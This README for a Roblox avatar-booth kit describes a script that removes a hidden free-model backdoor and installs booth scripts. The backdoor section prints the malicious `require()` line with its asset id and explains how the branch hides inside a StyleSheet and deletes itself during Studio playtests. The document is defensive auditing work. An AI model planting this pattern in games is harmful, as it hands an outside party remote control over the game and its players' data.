# RateMyAvatarBooth

Two ways to get the booth functionality into your game:

## `InjectBoothScripts.lua` — run this in Studio's Command Bar (recommended)

Since Studio was reporting the `.rbxm` file as corrupted on import, this is
the reliable path: a single self-contained Lua script you paste into
**Roblox Studio → View tab → Command Bar** and run directly against your
existing "Rate My Avatar Booth" model already in your place. No file
import needed at all.

**How to run it:**
1. In Studio's Explorer, select your booth `Model` (the one containing
   `Tabletop`, `Banner`, etc.) — or skip this and it'll search the game
   for a `Model` named "Booth" automatically.
2. Open **View → Command Bar**.
3. Open `dist/InjectBoothScripts.lua`, copy its entire contents, paste
   into the Command Bar, press Enter.
4. Check the Output window — it prints exactly what it removed and added.

**What it does, in order:**
1. **Removes a hidden backdoor** that was in the uploaded model (see
   below for details) — it detects it structurally (any `StyleSheet`
   containing a `Humanoid` descendant, plus a signature check on the
   scripts' source) so it'll catch the backdoor wherever it's hiding, not
   just at the exact path it happened to be in your file.
2. **Adds a `ProximityPrompt`** to your `Tabletop` part (claim/customize
   trigger).
3. **Adds `Remotes`** (`RequestClaim`, `RequestSaveBooth` RemoteEvents)
   and **`State`** (`OwnerUserId`, `CustomTextValue`, `CustomImageIdValue`)
   folders.
4. **Installs `BoothServer` and `BoothClientUI` Scripts**, wired to your
   model's real `Banner → SurfaceGui → Frame → Description`/`Icon` layout.

It's **safe to run more than once** — it won't create duplicates or
re-remove things that are already gone.

This script is generated from `booth-kit/BoothServer.lua` and
`booth-kit/BoothClientUI.lua` by `tools/generate_command_bar_script.py`;
edit those two files and re-run that generator if you want to change the
behavior, rather than hand-editing the generated file.

### ⚠️ About the backdoor it removes

The uploaded `Rate My Avatar Booth.rbxm` contained a disguised malicious
branch hidden inside a `StyleSheet` named "Extra":

```
Extra (StyleSheet)
 └─ Humanoid
     ├─ HumanoidController "Instance"
     │   └─ HumanoidDescription
     │       └─ HumanoidRigDescription
     │           └─ Script "CoreTextureSystem"   (13KB, disguised as a
     │               │                            lighting/texture utility)
     │               └─ NumberPose "Pose"         (Value = 102764929247228,
     │                                              a Roblox asset id hidden
     │                                              in a numeric property)
     └─ Script "Script"   (destroys the whole branch, but only when
                            game.JobId == "" — i.e. only during Studio
                            playtesting, so it looks clean when you test it)
```

Buried in the "CoreTextureSystem" script was:

```lua
local TextureConfiguration = require(script:WaitForChild("Pose", 4).Value)
```

`require()` on a numeric id loads and executes a `ModuleScript` **live
from Roblox's servers** — meaning whoever controls that asset id could
push arbitrary code into your published game at any time (steal
DataStores, grant themselves admin, ban/kick players, wipe your game,
etc.), all while looking completely clean in a normal Studio playtest.
This is a well-known "free-model backdoor" pattern; the "Model made by
@rewq" / "Credits:@rewq" tags suggest it came from a public free-models
site.

## `RateMyAvatarBooth.rbxm` / `Rate My Avatar Booth (patched).rbxm`

Pre-built `.rbxm` files with the same functionality (one is a from-scratch
original kit, the other a byte-level patched copy of the uploaded model).
Kept for reference, but since Studio flagged the import as corrupted, use
`InjectBoothScripts.lua` above instead.

## Files

- `booth-kit/BoothServer.lua` — `Script` (RunContext = Server). Owns all
  state changes (claiming, text/image validation) and refreshes the
  on-booth display. References `Tabletop`/`Banner`/`Description`/`Icon` to
  match the uploaded model's naming.
- `booth-kit/BoothClientUI.lua` — `Script` (RunContext = Client). Builds
  the popup editor UI on demand and fires the two `RemoteEvent`s to the
  server.
- `dist/InjectBoothScripts.lua` — generated Command Bar script combining
  the backdoor removal + the two scripts above into one paste-and-run file.

## Regenerating

```
# Regenerate the Command Bar injector after editing the Luau scripts:
python3 tools/generate_command_bar_script.py

# Rebuild the from-scratch kit .rbxm:
python3 tools/build_booth_kit.py dist/RateMyAvatarBooth.rbxm

# Re-patch a (re-)uploaded source model .rbxm:
python3 tools/patch_booth_model.py "Rate My Avatar Booth.rbxm" \
    "dist/Rate My Avatar Booth (patched).rbxm"
```

`tools/rbxbinary_inspect.py` can be pointed at any `.rbxm`/`.rbxl` to dump
its full instance tree and properties — useful for auditing any future
free models before trusting them:

```
python3 tools/rbxbinary_inspect.py "some_model.rbxm"
```

## How the tooling was built

Since this sandbox has no access to Roblox Studio, the `.rbxm` tooling
relies on a small, hand-written implementation of Roblox's binary model
format:

- `tools/rbxbinary.py` — from-scratch writer (used to build brand new
  `.rbxm` files).
- `tools/rbxbinary_inspect.py` — general-purpose reader/decompressor
  (LZ4 + Zstd) for inspecting arbitrary real-world `.rbxm`/`.rbxl` files.
- `tools/rbxbinary_reader.py` — a narrower reader used only to round-trip
  verify files produced by `rbxbinary.py`.
- `tools/patch_booth_model.py` — combines the above to do targeted,
  chunk-level surgery on an existing file (remove specific instances by
  class, append new ones) without re-encoding anything it doesn't need to
  touch.
- `tools/generate_command_bar_script.py` — embeds the two Luau scripts
  into a single paste-and-run Command Bar script that performs the same
  backdoor removal + wiring live inside Studio, with no file import step.

All of the `.rbxm` format handling is based on the format documented by
the open-source `rbx-dom` project's `rbx_binary` Rust crate
(https://github.com/rojo-rbx/rbx-dom).

The generated Command Bar script (`dist/InjectBoothScripts.lua`) was
syntax-checked and functionally tested end-to-end against a mock
Roblox Instance tree modeled on the real uploaded file's structure,
confirming it removes the backdoor, wires up the booth correctly, leaves
unrelated instances untouched, and is safe to run more than once.
